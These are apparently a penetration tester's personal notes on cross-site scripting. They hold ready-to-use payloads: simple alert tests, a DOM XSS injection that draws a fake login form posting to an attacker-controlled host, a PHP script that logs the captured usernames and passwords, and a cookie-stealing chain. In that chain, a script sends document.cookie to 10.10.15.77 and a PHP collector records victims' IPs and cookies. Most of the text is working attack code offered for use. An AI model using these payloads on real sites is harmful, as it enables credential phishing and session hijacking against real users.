#xss
#cheatseet:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

automation:
https://github.com/mandatoryprogrammer/xsshunter-express

give it a try for stored xss:
* evil svg
* pdf for xss
* `<img src=x onerror=alert(1) />`

typical payload:
blink: ip, cookie, url

**DOM XSS payload**:
[[DOM-based XSS]]
```html
<img src="" onerror=alert(window.origin)>
```

example payload of login form for DOM XSS:
```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

server:
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.10.15.77/phishing/index.php");
    fclose($file);
    exit();
}
?>
```


```html
<img src=x onerror="&#x61;lert(1)">
```

#### Blind XSS

Common places:
- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

#### Example of hijacking cookies:
[[Session hijacking]]
Run server:
```php
php -S 0.0.0.0:8000
```

`index.php`
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
script.js
```js
new Image().src='http://10.10.15.77:8000/index.php?c='+document.cookie;
```
payload:
```html
"><script src=http://10.10.15.77:8000/script.js></script>
```
